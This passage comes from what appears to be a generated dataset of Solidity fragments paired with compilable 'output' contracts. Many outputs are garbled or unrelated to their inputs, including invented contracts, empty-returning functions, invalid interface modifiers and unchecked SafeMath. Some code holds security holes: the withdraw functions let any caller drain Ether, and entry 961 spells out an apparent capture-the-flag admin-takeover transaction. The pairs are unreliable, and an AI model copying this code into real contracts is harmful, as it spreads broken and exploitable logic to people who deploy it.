        "output": "//SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.7.0<0.9.0;\n\ncontract Withdraw {\n    constructor() payable {}\n\n    function withdrawByTransfer(uint256 amount) public payable {\n        payable(msg.sender).transfer(amount);\n    }\n\n    function withdrawBySend(uint256 amount) public payable {\n        bool success = payable(msg.sender).send(amount);\n        require(success, \"Failed to send Ether\");\n    }\n\n    function withdrawByCall(uint256 amount) public returns(bytes memory) {\n        (bool success, bytes memory result) = payable(msg.sender).call{value: amount}(\"\");\n        require(success, \"Failed to withdraw Ether\");\n\n        return result;\n    }\n}\n\n"
    },
    "930.sol": {
        "input": "function getCardsByOwner(address user) external view returns(uint[] memory _cards) {\n    uint[] memory result = new uint[](userToCardsCount[user]);\n    uint counter = 0;\n    for (uint i = 0; i < cards.length; i++) {\n        if (cardIdToUser[i] == user) {\n            result[counter] = cards[i];\n            counter++;\n        }\n    }\n    return result;\n}\n\nconst getCards = async () => {\n    if (typeof window.ethereum !== 'undefined'){\n        const provider = new ethers.providers.Web3Provider(window.ethereum) \n        const signer = provider.getSigner()\n        const contract = new ethers.Contract(cardsAddress, Cards.abi, signer)\n        try {\n            const data = await contract.getCardsByOwner(signer.getAddress())\n            console.log(await contract.getOwnCards())\n            console.log(data)\n        } catch (error) {\n            console.log(error)\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Cards {\n    function getCardsByOwner(address user) external view returns(uint[] memory _cards);\n}\n\n"
    },
    "931.sol": {
        "input": "modifier ownerOnly{\n        require(msg.sender == owner,\"Invalid caller\");\n        _;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Ownable {\n    address public owner;\n\n    modifier ownerOnly() {\n        require(msg.sender == owner,\"Invalid caller\");\n        _;\n    }\n    \n    constructor() public {\n        owner = msg.sender;\n    }\n}\n\n"
    },
    "932.sol": {
        "input": "    function mint(address _to, uint256 _quantity) \n        external  \n        payable\n        isCorrectPayment(_quantity)\n        isAvailable(_quantity) \n    {\n        mintInternal(_to, _quantity);\n    }\n\n    function mintInternal(address _to, uint256 _quantity) internal {\n        for (uint256 i = 0; i < _quantity; i++) {\n            uint256 tokenId = nextId.current();\n            nextId.increment();\n\n            _safeMint(_to, tokenId);\n\n            emit Mint(tokenId);\n        }\n    } \n\n    modifier isCorrectPayment(uint256 _quantity) {\n        require(msg.value == (price * _quantity), \"Incorrect Payment Sent\");\n        _;\n    }\n\n    modifier isAvailable(uint256 _quantity) {\n        require(nextId.current() + _quantity <= MAX_SUPPLY, \"Not enough tokens left for quantity\");\n        _;\n    }\n\n    <CrossmintPayButton\n        clientId=\"_YOUR_CROSSMINT_CLIENT_ID_\"\n        environment=\"staging\"\n        mintConfig={{\n            totalPrice: \"0.001\",\n            _quantity: \"1\"\n    }}\n    />\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n    function add(uint a, uint b) internal pure returns (uint) {\n        return a + b;\n    }\n\n    \n    function sub(uint a, uint b) internal pure returns (uint) {\n        return a - b;\n    }\n\n    \n    function mul(uint a, uint b) internal pure returns (uint) {\n        return a * b;\n    }\n\n    \n    function div(uint a, uint b) internal pure returns (uint) {\n        return a / b;\n    }\n\n    \n    function mod(uint a, uint b) internal pure returns (uint) {\n        return a % b;\n    }\n}\n\ninterface Crossmint {\n    function mint(address _to, uint256 _quantity) external payable;\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint);\n    function balanceOf (address account) external view returns (uint);\n    \n    function allowance(address account, address spender) external view returns (uint);\n}\n\ncontract Ownable {\n    address private owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    \n    constructor () {\n        owner = msg.sender;\n    }\n\n    \n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner\");\n        _;\n    }\n\n    \n    function transferOwnership(address newOwner) public onlyOwner {\n        require(newOwner != address(0), \"Ownership cannot be transferred to zero address\");\n        owner = newOwner;\n        emit OwnershipTransferred(owner, newOwner);\n    }\n}\n\n"
    },
    "933.sol": {
        "input": "pragma solidity ^0.8.15;\n\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol\";\nimport \"./Energy.sol\";\nimport \"./Fuel.sol\";\n\n\ncontract Generator is Ownable, ReentrancyGuard, ERC721Holder {\nFuel fuel;\nEnergy energy;\n\nstruct Loader {\nuint256[] fuelIds;\nmapping(uint256 => uint256) loadBlock;\n}\n\nuint256 rewardsPerBlock = 5;\n\nmapping(address => Loader) loaders;\n\nmapping(address => mapping(uint256 => uint256)) public fuelIdIndex;\n\nmapping(uint256 => address) public loaderOf;\n\nconstructor(address _fuel, address _energy) {\n    fuel = Fuel(_fuel);\n    energy = Energy(_energy);\n}\n\nfunction stake(uint256 fuelId) public nonReentrant {\n    require(\n        fuel.ownerOf(fuelId) == msg.sender,\n        \"You're not the owner of this NFT\"\n    );\n\n    loaders[msg.sender].fuelIds.push(fuelId);\n\n    uint256 totalFuel = loaders[msg.sender].fuelIds.length;\n    fuelIdIndex[msg.sender][fuelId] = totalFuel - 1;\n\n    loaders[msg.sender].loadBlock[fuelId] = block.number;\n\n    loaderOf[fuelId] = msg.sender;\n\n    fuel.safeTransferFrom(address(msg.sender), address(this), fuelId);\n}\n\nfunction unstake(uint256 fuelId) public nonReentrant {\n    require(msg.sender == loaderOf[fuelId], \"You are not the owner\"); \n\n\n    uint256 lastFuelIndex = loaders[msg.sender].fuelIds.length - 1;\n    uint256 fuelIndex = fuelIdIndex[msg.sender][fuelId];\n\n    if (lastFuelIndex != fuelIndex) {\n        uint256 lastFuelId = loaders[msg.sender].fuelIds[lastFuelIndex];\n\n        loaders[msg.sender].fuelIds[fuelIndex] = lastFuelIndex; \n last token to the slot of the to-delete token\n        fuelIdIndex[msg.sender][lastFuelId] = fuelIndex; \n moved token's index\n    }\n\n    delete fuelIdIndex[msg.sender][fuelId];\n    delete loaders[msg.sender].fuelIds[lastFuelIndex];\n\n    delete loaders[msg.sender].loadBlock[fuelId];\n    \n\n    fuel.safeTransferFrom(address(this), address(msg.sender), fuelId);\n    claim(fuelId);\n}\n\nfunction claim(uint256 fuelId) public {\n    require(msg.sender == loaderOf[fuelId], \"You are not the owner\");\n\n\n    uint256 rewardsToClaim = getPendingRewards(msg.sender, fuelId);\n    energy.mintRewards(msg.sender, rewardsToClaim);\n\n    loaders[msg.sender].loadBlock[fuelId] = block.number;\n    delete loaderOf[fuelId];\n}\n\nfunction claimAll() public nonReentrant {\n    require(\n        loaders[msg.sender].fuelIds.length > 0,\n        \"You have no fuel loaded here!\"\n    );\n\n    uint256 totalFuelLoaded = totalFuelLoadedBy(msg.sender);\n\n    for (uint256 i = 0; i < totalFuelLoaded; i++) {\n        uint256 fuelId = loaders[msg.sender].fuelIds[i];\n        claim(fuelId);\n    }\n}\n\nfunction getPendingRewards(address account, uint256 fuelId) public view \nreturns (uint256) {\n\n    uint256 loadBlock = loaders[account].loadBlock[fuelId];\n    uint256 blocksElapsed = block.number - loadBlock;\n\n    return blocksElapsed * rewardsPerBlock;\n}\n\nfunction getAllPendingRewards() public view returns (uint256) {\n    uint256 totalFuelLoaded = totalFuelLoadedBy(msg.sender);\n\n    uint256 totalRewards = 0;\n    for (uint256 i = 0; i < totalFuelLoaded; i++) {\n        uint256 fuelId = loaders[msg.sender].fuelIds[i];\n        totalRewards += getPendingRewards(msg.sender, fuelId);\n    }\n\n    return totalRewards;\n}\n\nfunction _loaderOf(uint256 fuelId) public view returns (address) {\n    return loaderOf[fuelId];\n}\n\nfunction totalFuelLoadedBy(address account) public view returns (uint256) {\n    return loaders[account].fuelIds.length;\n}\n\nfunction generatorAddress() public view returns (address) {\n    return address(this);\n}\n\n\nfunction onERC721Received(address, address, uint256, bytes memory) public \nvirtual override returns (bytes4) {\n    return this.onERC721Received.selector;\n}\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC1155 {\n    function getPendingRewards(address owner, uint256 fuelId) external view returns (uint256) ;\n}\n\ninterface Fuel {\n    function ownerOf(uint256 fuelId) external view returns (address);\n}\n\ninterface Energy {\n    function mintRewards(address, uint256) external;\n}\n\ninterface IERC721 {\n    event Received(address indexed from, address indexed to, uint256 value);\n\n    function onERC721Received(address from, address to, uint256 value) external virtual returns (bytes4);\n}\n\n"
    },
    "934.sol": {
        "input": "pragma solidity 0.8.7;\ncontract MyContract{\n    bytes8 [] Names;\n    \n    function setName(string memory _name) public{\n        bytes8 newName=bytes8(bytes(_name));\n        Names.push(newName);\n    }\n}\n\nfunction setName(bytes8 _name) public{\n        Names.push(_name);\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract NameStorage {\n  \n    mapping (address=>bytes8[] ) public Names;\n    \n    \n    function getNames() public view returns (bytes8[] memory namesArray) { Names; }\n\n   \n}\n\n"
    },
    "935.sol": {
        "input": "function funFind() public view returns(uint) {\n    uint temp;\n    for(uint i = 0; i < arr.length; i++) {\n        temp = arr[i];\n        for(uint j = 0; j < arr.length; j++) {\n            if((j != i) && (temp == arr[j])) {\n                return temp;\n            }\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Find {\n    uint[10] private arr = [4, 6, 8, 12, 14, 16, 20, 22, 24];\n   \n    function funFind() public view returns(uint) {\n        uint temp;\n        for(uint i = 0; i < arr.length; i++) {\n            temp = arr[i];\n            for(uint j = 0; j < arr.length; j++) {\n                if((j != i) && (temp == arr[j])) {\n                    return temp;\n                }\n            }\n        }\n    }\n}\n\n"
    },
    "936.sol": {
        "input": "constituencyRegister.push(c);\n\npragma solidity ^0.8.0;\n\ncontract MuC {\n    struct voter{\n        string name;\n        address constituency;\n        uint age;\n        bool isVoted;\n    }\n\n    struct constituency{\n        string name;\n        voter[] candidates;\n    }\n\n    constituency[] public constituencyRegister;\n    function addConstituency(string memory _name,voter[] memory _candidates)\n        public\n    {\n        constituency storage c = constituencyRegister.push();\n        c.name = _name;\n        for(uint i = 0; i < _candidates.length; i++) {\n            c.candidates.push(_candidates[i]);\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MuC {\n    struct voter{\n        string name;\n        address constituency;\n        uint age;\n        bool isVoted;\n    }\n\n    struct constituency{\n        string name;\n        voter[] candidates;\n    }\n\n    constituency[] public constituencyRegister;\n    function addConstituency(string memory _name,voter[] memory _candidates)\n        public\n    {\n        constituency storage c = constituencyRegister.push();\n        c.name = _name;\n        for(uint i = 0; i < _candidates.length; i++) {\n            c.candidates.push(_candidates[i]);\n        }\n    }\n}\n\n"
    },
    "937.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    mapping(address => bool) public myMap;\n    \n    constructor() {\n        myMap[address(0x123)] = true;\n        myMap[address(0x456)] = false;\n        myMap[address(0x789)] = true;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    mapping(address => bool) public myMap;\n    \n    constructor() {\n        myMap[address(0x123)] = true;\n        myMap[address(0x456)] = false;\n        myMap[address(0x789)] = true;\n    }\n}\n\n"
    },
    "939.sol": {
        "input": "function payRequest(address payable _recipient, uint256 _amount)payable public {\n        \n        (bool success, bytes memory transactionBytes) = _recipient.call{value:_amount}('');\n        \n        emit TransactionBytes(transactionBytes);\n        \n        emit RequestPaid(msg.sender, _amount);\n    }\n\n\n",
        "output": "pragma solidity ^0.7.6;\ncontract Requester {\n\n    event TransactionBytes(bytes transactionBytes);\n    event RequestPaid(address payable sender, uint256 amount);\n\n    function payRequest(address payable _recipient, uint256 _amount)payable public {\n        \n        (bool success, bytes memory transactionBytes) = _recipient.call{value:_amount}('');\n        \n        emit TransactionBytes(transactionBytes);\n        \n        emit RequestPaid(msg.sender, _amount);\n    }\n}\n\n"
    },
    "940.sol": {
        "input": "contract Users {\n    struct User {\n        string username;\n        uint[] grades;\n        address byWhom;\n        uint timestamp;\n    }\n    mapping(string => User) userMap;\n\n    event userDetailsChanged(\n        string username,\n        uint grade\n    );\n    function setUserDetails(string memory _username, uint _grade) external {\n        if(userMap[_username].grades.length==0){\n            User storage currentUser=userMap[_username];\n            currentUser.grades.push(_grade);\n            return;\n        } \n        userMap[_username].username = _username;\n        userMap[_username].grades.push(_grade);\n        userMap[_username].byWhom=msg.sender;\n        userMap[_username].timestamp=block.timestamp;\n        \n\n        emit userDetailsChanged(_username, _grade);\n    }\n\n    function getUserGrades(string memory _username) external view returns(uint[] memory _grades) {\n        return (\n            userMap[_username].grades\n        );\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Users {\n    struct User {\n        string username;\n        uint[] grades;\n        address byWhom;\n        uint timestamp;\n    }\n    mapping(string => User) userMap;\n\n    event userDetailsChanged(\n        string username,\n        uint grade\n    );\n    function setUserDetails(string memory _username, uint _grade) external {\n        // if _username exists add your logic \n        // i cannot just write this: userMap[_username]. it cannot be convertible bool because if it does not exists, evm will return struct with default values\n        if(userMap[_username].grades.length==0){\n            User storage currentUser=userMap[_username];\n            currentUser.grades.push(_grade);\n            return;\n        } \n        userMap[_username].username = _username;\n        userMap[_username].grades.push(_grade);\n        // you might need to add restriction rule to allow certain people to call this function.\n        // msg.sender is the caller of this function\n        userMap[_username].byWhom=msg.sender;\n        userMap[_username].timestamp=block.timestamp;\n        \n\n        // YOU COULD ALSO DO THIS \n        // userMap[_username]=User(\n        //     _username,\n        //     _grade,\n        //     msg.sender,\n        //     block.timestamp\n        // )\n        emit userDetailsChanged(_username, _grade);\n    }\n\n    function getUserGrades(string memory _username) external view returns(uint[] memory _grades) {\n        return (\n            userMap[_username].grades\n        );\n    }\n}\n\n"
    },
    "941.sol": {
        "input": "  function addFunds(\n    uint256 id,\n    uint96 amount\n  )\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract CryptoFundsAddition {\n\n  event FundsAdded(\n    uint256 id,\n    uint96 amount\n  );\n\n  function addFunds(\n    uint256 id,\n    uint96 amount\n  ) public {\n    emit FundsAdded(id, amount);\n  }\n\n}\n\n"
    },
    "944.sol": {
        "input": "function getBikes() public view returns (Bike[] memory){\n    return bikes;\n}\n\nfunction changeAvailability() public {\n    bikes[1].isAvailable=false;\n}\n\nconst ABI = [\"function greet() public view returns (string)\"]\nconst contract = new ethers.Contract(contractAddress, ABI, provider);\n\nconst ABI = [\n\"function setGreeting(string _greeting) public\",\n\"function deposit() public payable\"\n]\nconst contract = new ethers.Contract(contractAddress, ABI, signer)\n\nimport React, {useState, useEffect} from 'react'\nconst { ethers } = require(\"ethers\");\n\nfunction App1() {\n  const [greet, setGreet] = useState('')\n  const [balance, setBalance] = useState(0)\n  const [depositValue, setDepositValue] = useState('')\n  const [greetingValue, setGreetingValue] = useState('')\n  const [isWalletConnected, setIsWalletConnected] = useState(false)\n  const contractAddress = \"0x5FbDB2315678afecb367f032d93F642f64180aa3\"\n  const ABI = [\n    \"function greet() public view returns (string)\",\n    \"function setGreeting(string _greeting) public\",\n    \"function deposit() public payable\"\n  ]\n\n  const checkIfWalletIsConnected = async () => {\n    try {\n      if (window.ethereum) {\n        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })\n        const account = accounts[0];\n        setIsWalletConnected(true);\n        console.log(\"Account Connected: \", account);\n      } else {\n        console.log(\"No Metamask detected\");\n      }\n    } catch (error) {\n      console.log(error);\n    }\n  }\n\n  const getBalance = async () => {\n    try{\n        if(window.ethereum){\n            const provider = new ethers.BrowserProvider(window.ethereum);\n\n            const balance = await provider.getBalance(contractAddress)\n            const balanceFormatted = ethers.formatEther(balance)\n            setBalance(balanceFormatted)\n        } else{\n            console.log(\"Ethereum object not found, install Metamask.\");\n        }\n    } catch (error) {\n        console.log(error)\n    }\n  }\n\n  const getGreeting = async () => {\n    try{\n        if(window.ethereum){\n            const provider = new ethers.BrowserProvider(window.ethereum);\n            const contract = new ethers.Contract(contractAddress, ABI, provider);\n\n            const greeting = await contract.greet()\n            setGreet(greeting)\n        } else{\n            console.log(\"Ethereum object not found, install Metamask.\");\n        }\n    } catch (error) {\n        console.log(error)\n    }\n  }\n\n  const handleGreetingChange = (e) => {\n    setGreetingValue(e.target.value)\n  }\n  \n  const handleGreetingSubmit = async (e) => {\n    try{\n        e.preventDefault()\n        if(window.ethereum){\n            const provider = new ethers.BrowserProvider(window.ethereum);\n            const signer = await provider.getSigner();\n            const contract = new ethers.Contract(contractAddress, ABI, signer);\n\n            const greetingUpdate = await contract.setGreeting(greetingValue)\n            await greetingUpdate.wait()\n            setGreet(greetingValue)\n            setGreetingValue('')\n        } else {\n            console.log(\"Ethereum object not found, install Metamask.\");\n        }\n    } catch (error) {\n        console.log(error)\n    }\n  } \n\n  const handleDepositchange = (e) => {\n    setDepositValue(e.target.value)\n  }\n\n  const handleDepositSubmit = async (e) => {\n    try{\n        e.preventDefault()\n        if(window.ethereum){\n            const provider = new ethers.BrowserProvider(window.ethereum);\n            const signer = await provider.getSigner();\n            const contract = new ethers.Contract(contractAddress, ABI, signer);\n\n            const ethValue = ethers.parseEther(depositValue)\n            const depositEth = await contract.deposit({value: ethValue})\n            await depositEth.wait()\n            const balance = await provider.getBalance(contractAddress)\n            const balanceFormatted = ethers.formatEther(balance)\n            setBalance(balanceFormatted)\n        } else {\n            console.log(\"Ethereum object not found, install Metamask.\");\n        }\n    } catch (error) {\n        console.log(error)\n    }\n  }\n\n  useEffect(() => {\n    checkIfWalletIsConnected();\n    getBalance();\n    getGreeting()\n  }, [isWalletConnected])\n\n\n  return (\n    <div className=\"container\">\n      <div className=\"container\">\n        <div className=\"row mt-5\">\n          <div className=\"col\">\n            <h3>{greet}</h3>\n            <p>Contract balance: {balance} ETH</p>\n          </div>\n          <div className=\"col\">\n            <form onSubmit={handleDepositSubmit}>\n              <div className=\"mb-3\">\n                <input type=\"number\" className=\"form-control\" placeholder=\"0\" onChange = {handleDepositchange} value={depositValue}/>\n              </div>\n              <button type=\"submit\" className=\"btn btn-success\">Deposit</button>\n            </form>\n            <form className=\"mt-5\" onSubmit={handleGreetingSubmit}>\n              <div className=\"mb-3\">\n                <input type=\"text\" className=\"form-control\" onChange={handleGreetingChange} value={greetingValue}/>\n              </div>\n              <button type=\"submit\" className=\"btn btn-dark\">Change</button>\n            </form>\n          </div>\n        </div>\n      </div>\n    </div>\n  );\n}\n\nexport default App1;\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary LibStringLib {\n  function greet() public view returns (string memory) {\n    return \"MetaMythic Moo\";\n  }\n}\n\n"
    },
    "945.sol": {
        "input": "pragma solidity ^0.8;\n\ninterface IERC20 {\n    function transferFrom(address, address, uint256) external returns (bool);\n}\n\ncontract WDfromContractOwner {\n    address public owner;\n\n    function withdrawToken() external {\n        address mainnetUSDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n        address receiver = msg.sender; \n        uint256 amount = 5 * 1e6; \n        require(\n            IERC20(mainnetUSDT).transferFrom(owner, receiver, amount)\n        );\n    }\n}\n\nconst USDTAddress = \"0xdAC17F958D2ee523a2206206994597C13D831ec7\";\nconst ownerAddress = \"0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF\";\n\nconst ABI = [\n    {\"constant\":true,\"inputs\":[{\"name\":\"who\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"}\n];\n\nconst USDTContract = new web3.eth.Contract(ABI, USDTAddress);\nconst approved = await USDTContract.methods.balanceOf(ownerAddress).call();\nconsole.log(approved);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function transferFrom(address, address, uint256) external returns (bool);\n}\n\ncontract WDfromContractOwner {\n    address public owner;\n\n    function withdrawToken() external {\n        address mainnetUSDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n        address receiver = msg.sender; \n        uint256 amount = 5 * 1e6; \n        require(\n            IERC20(mainnetUSDT).transferFrom(owner, receiver, amount)\n        );\n    }\n}\n\n"
    },
    "946.sol": {
        "input": "_owners[0] = '0x11'\n_owners[1] = '0x22'\n_owners[2] = '0x33'\n_owners[3] = '0x44'\n\ntotalSupply = 4\n\ndelete _owners[2]\ntotal -= 1\n\nfor (uint256 i; i < total; i++) {\n   tokenIds[i] = ownerOf(i);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function ownerOf(uint256 tokenId) external view returns (address);\n    function approve(address spender, uint256 tokenId) external returns (bool);\n    function transferFrom(address from, address to, uint256 tokenId) external returns (bool);\n    function transfer(address recipient, uint256 tokenId) external returns (bool);\n}\n\n"
    },
    "947.sol": {
        "input": "import \"./ERC721Connector.sol\"; \n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC1155 {\n    function tokensOf(address tokenOwner) external view returns (uint256[] memory tokens);\n}\n\n"
    },
    "949.sol": {
        "input": "    event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);\n\nconst txResponse = await myNFT.mintNFT(deployer.address, newMintItem.uri);\n\nconst txReceipt = await txResponse.wait();\n\nconst [transferEvent] = txReceipt.events;\n\nconst { tokenId } = transferEvent.args;\n\ndescribe('Receiving a value returned by a transacting function', () => {\n    it('Should return a correct ID of the newly minted item', async () => {\n      const newMintItem = {\n        id: 1,\n        uri: 'ipfs:\n      };\n      const txResponse = await myNFT.mintNFT(deployer.address, newMintItem.uri);\n      const txReceipt = await txResponse.wait();\n      const [transferEvent] = txReceipt.events;\n      const { tokenId } = transferEvent.args;\n      expect(tokenId).to.equal(newMintItem.id);\n    });\n  });\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IMyNFT {\n  function mintNFT(address to, string calldata uri) external;\n}\n\n"
    },
    "951.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        address to = payable(address(0x0));\n        bytes memory sendData = new bytes(12); \n        to.call{value: 1000000000000, gas: 163502}(sendData);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        address to = payable(address(0x0));\n        bytes memory sendData = new bytes(12); // empty 12 byte array\n        to.call{value: 1000000000000, gas: 163502}(sendData);\n    }\n}\n\n"
    },
    "952.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    mapping (address => uint256) contributions;\n\n    receive() external payable {\n        contributions[msg.sender] += msg.value;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    mapping (address => uint256) contributions;\n\n    receive() external payable {\n        contributions[msg.sender] += msg.value;\n    }\n}\n\n"
    },
    "953.sol": {
        "input": "let result = web3.eth.abi.decodeLog([{\n    type: 'string',\n    name: 'tokenTicker',\n    indexed: true\n    }],\n    data,\n    topics[1]);\n\nevent BridgeAdded(\n        uint256 indexed id,\n        string tokenTicker,\n        string tokenName,\n        string imageUrl\n    );\n\nevent BridgeAdded(\n            string indexed indexedTokenTicker,\n            string tokenTicker,\n            string tokenName,\n            string imageUrl\n        );\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BridgeAdded {\n\n    event BridgeAdded(\n        uint256 indexed id,\n        string tokenTicker,\n        string tokenName,\n        string imageUrl\n    );\n\n    event BridgeAdded(\n            string indexed indexedTokenTicker,\n            string tokenTicker,\n            string tokenName,\n            string imageUrl\n        );\n}\n\n"
    },
    "954.sol": {
        "input": "const provider = new ethers.providers.Web3Provider(window.ethereum, \"any\");\nawait provider.send(\"eth_requestAccounts\", []);\nconst signer = provider.getSigner();\n\nconst abi = [\"function associate()\"];\n\nconst tokenSolidityAddress = '0x' + TokenId.fromString('0.0.572609').tokenSolidityAddress();\n\n  const contract = new ethers.Contract(tokenSolidityAddress, abi, signer);\n\n  try {\n    const transactionResult = await contract.associate();\n    return transactionResult.hash;\n  } catch (error) {\n    console.warn(error.message ? error.message : error);\n    return null;\n  }\n\nasync function dissociateToken() {\n    const provider = new ethers.providers.Web3Provider(window.ethereum, \"any\");\n    await provider.send(\"eth_requestAccounts\", []);\n    const signer = provider.getSigner();\n    const abi = [\"function dissociate()\"];\n    const tokenSolidityAddress = '0x' + TokenId.fromString('0.0.572609').tokenSolidityAddress();\n    const contract = new ethers.Contract(tokenSolidityAddress, abi, signer);\n  \n    try {\n      const transactionResult = await contract.dissociate();\n      return transactionResult.hash;\n    } catch (error) {\n      console.warn(error.message ? error.message : error);\n      return null;\n    } \n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface TokenIdInterface {\n  function associate() external returns (bytes32);\n  function dissociate() external returns (bytes32);\n}\n\n"
    },
    "955.sol": {
        "input": "    require(\n        msg.value.getconversionRate(priceFeed) >= minimumUSD,\n        \"Didn't send enough!\"\n    );\n\n        it.only(\"Fails if not sending enough ETH\", async function () {\n            await expect(fundMe.fund()).to.be.revertedWith(\n                \"Didn't send enough!\"\n            )\n        })\n\n\n",
        "output": "pragma solidity ^0.8.9;\n  interface ICurvePriceFeed {\n    function getconversionrate() external view returns (uint);\n  }\n\n"
    },
    "956.sol": {
        "input": "module.exports = {\n  solidity: {\n    compilers: [\n      {\n        version: \"0.8.2\",\n      },\n      {\n        version: \"0.8.9\",\n      },\n    ],\n  },\n};\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleMultiplier {\n\n  function multiplier(int32 a, int32 b) public pure returns (int32) {\n    return a * b;\n  }\n}\n\n"
    },
    "957.sol": {
        "input": "Array(parseInt(requestCount))\n\nfunction getRequests() external view returns (Request[] memory) {\n    return requests;\n}\n\nconst requests = await campaign.methods.getRequests().call();\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Request {\n    function accept() external;\n}\n\ncontract Campaign {\n    function getRequests() external view returns (Request[] memory) {\n        return requests;\n    }\n    address private owner;\n    address campaign;\n    uint requestCount;\n    Request[] requests;\n    mapping(address => Request[]) requestsByAddress;\n    event RequestsCreated(address[] callee, uint[] requests);\n\n    constructor(address _campaign) {\n        owner = msg.sender;\n        campaign = _campaign;\n    }\n    \n    modifier restricted() {\n        require(owner == msg.sender || isManager(msg.sender), \"Restricted function call\");\n        _;\n    }\n    \n    function isManager(address account) public view returns(bool) {\n        return msg.sender == owner || accounts[account];\n    }\n    \n    mapping(address => bool) accounts;\n    \n    function addManager(address account) restricted public {\n        accounts[account] = true;\n    }\n\n    function removeManager(address account) restricted public {\n        require(accounts[account], \"Account not manager\");\n        delete accounts[account];\n    }\n    \n    receive() external payable {\n    }\n    \n    fallback() external payable {\n    }\n}\n\n"
    },
    "958.sol": {
        "input": " mapping(address => uint) public balanceOf;\n\ncontract UniswapV2Pair is IUniswapV2Pair, UniswapV2ERC20{}\n\nbalance0 = IERC20(_token0).balanceOf(address(this));\nbalance1 = IERC20(_token1).balanceOf(address(this));\n\nuint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\nuint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\nrequire(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');\n\n\n",
        "output": "pragma solidity ^0.8.9;\n abstract contract UniswapV2ERC20 {\n\n    function _swap(address tokenA, address tokenB, uint amountOutMin, address to, uint deadline) internal virtual returns (uint amountIn);\n}\n\n"
    },
    "960.sol": {
        "input": "contract testCatch{\n    function GetTest() public view returns (string memory)  {\n        address _token_addr = 0x406AB5033423Dcb6391Ac9eEEad73294FA82Cfbc;\n       \n        ERC165 candidateContract = ERC165(_token_addr);\n        try candidateContract.supportsInterface(0x80ac58cd) {\n\n             return \"tried\";\n        }\n        catch\n        {\n              return \"catch\";\n        }  \n}\n\n}\ninterface IERC165 {\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\n}\n \ncontract ERC165 is IERC165 {\n    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n        require(2==3,\"wrong calculation\");\n        return interfaceId == type(IERC165).interfaceId;\n    }\n}\n\ncontract ERC165 is IERC165 {\n    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n        return interfaceId == type(IERC165).interfaceId;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC165 {\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\n}\n\n"
    },
    "961.sol": {
        "input": "web3.eth.abi.encodeFunctionSignature(\"proposeNewAdmin(address)\");\n> '0xa6376746'\n\nweb3.eth.abi.encodeParameter(\"address\", player);\n> '0x000000000000000000000000c3a005e15cb35689380d9c1318e981bca9339942'\n\ncontract.sendTransaction({ data: '0xa6376746000000000000000000000000c3a005e15cb35689380d9c1318e981bca9339942' });\n\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract AdminProposal {\n\n    function proposeNewAdmin(address admin) external;\n}\n\n"
    },
    "962.sol": {
        "input": "function foo() public {\n    token.transfer(recipient, amount);\n}\n\nfunction foo() public {\n    (bool success, bytes memory returnedData) = address(token).call(\n        abi.encodeWithSignature(\n            \"transfer(address,uint256)\",\n            recipient,\n            amount\n        )\n    );\n}\n\nfunction foo() public {\n    try token.transfer(recipient, amount) returns (bool) {\n\n    } catch Error (string memory reason) {\n\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IMoneyToken {\n    function transfer(address to, uint256 value) external returns (bool);\n}\n\n"
    },
    "963.sol": {
